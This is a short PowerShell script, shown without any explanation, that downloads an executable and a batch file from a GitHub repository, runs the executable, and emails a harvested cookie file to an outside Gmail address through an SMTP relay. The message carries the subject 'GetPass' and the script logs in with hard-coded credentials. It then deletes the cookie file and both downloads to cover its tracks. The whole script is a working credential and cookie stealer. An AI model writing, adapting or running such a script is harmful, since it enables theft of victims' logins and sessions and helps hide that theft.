(new-object System.Net.WebClient).DownloadFile('https://github.com/YcVoz/cookie/raw/master/demo.exe','C:\demo.exe');
(new-object System.Net.WebClient).DownloadFile('https://github.com/YcVoz/cookie/raw/master/Command.txt','C:\Command.bat');
C:
.\demo.exe | Out-Null
$SMTPServer = 'smtp.mailtrap.io'

$SMTPInfo = New-Object Net.Mail.SmtpClient($SmtpServer, 587)

$SMTPInfo.EnableSsl = $true 

$SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('b54ababa9a8f80', 'e8ce20fc336bbc');

$ReportEmail = New-Object System.Net.Mail.MailMessage

$ReportEmail.From = 'mother-of-dragons@houseoftargaryen.net'

$ReportEmail.To.Add('jj55521932jj@gmail.com')

$ReportEmail.Subject = 'GetPass'

$ReportEmail.Body = 'GetPass_text'  
$ReportEmail.Attachments.Add('C:\coookie.txt')


$SMTPInfo.Timeout = 1000000
$SMTPInfo.Send($ReportEmail)
$ReportEmail.Attachments.Dispose()

remove-item 'C:\coookie.txt'
remove-item 'C:\Command.bat'
remove-item 'C:\demo.exe'

